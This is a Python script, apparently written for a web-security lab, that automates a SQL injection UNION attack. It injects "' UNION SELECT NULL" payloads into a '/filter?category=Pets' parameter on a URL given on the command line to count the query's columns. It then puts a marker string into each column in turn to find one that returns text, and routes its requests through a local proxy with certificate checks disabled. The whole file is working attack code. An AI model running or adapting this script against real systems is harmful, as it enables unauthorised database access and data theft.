import requests
import urllib3
import sys
proxies = {'http':'http://127.0.0.1:8082','https':'http://127.0.0.1:8082'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def ok_status(payload, fullpayload):
    payload1,payload2 = fullpayload[:len(fullpayload)//2],fullpayload[len(fullpayload)//2:]
    payload3 = payload2.replace(",","").split()

    for j in range(len(payload3)):
        payload3[j] = "'PY4skR'"
        strpayload = ", ".join(payload3)
        newpayload = payload1+strpayload+"--"
        pathfull = payload + newpayload
        s = requests.get(pathfull, verify=False, proxies=proxies)
        if s.status_code == 500:
            payload1,payload2 = fullpayload[:len(fullpayload)//2],fullpayload[len(fullpayload)//2:]
            payload3 = payload2.replace(",","").split()
            payload3[j] = 'NULL'
        elif s.status_code == 200:
            print("[+] SQL injection UNION attack, finding a column containing text successful")
            print("The payload is "+pathfull)
            k = j+1
            print("The column that contains data type of string is the %snd column "%k)
            break
        else:
            print("[+] SQL injection UNION attack, finding a column containing text unsuccessful")






def unionattack(payload):
    load = "' UNION SELECT "
    for i in range(1,10):
        if (i == 1):
            fullpayload = load + "NULL"
        else:
            fullpayload = fullpayload +", "+"NULL"
        full = payload + fullpayload + "--"
        r = requests.get(full, verify=False, proxies=proxies)
        if r.status_code == 200:
            ok_status(payload,fullpayload)
            print("The number of columns is %s"%i)
    return False




































if "__main__"== __name__:
    try:
      url = sys.argv[1].strip()
      payload = url + "/filter?category=Pets"
    except IndexError:
        print("[+] Usage <url> ")
        print("[+] Example https://example.com")
    unionattack(payload)







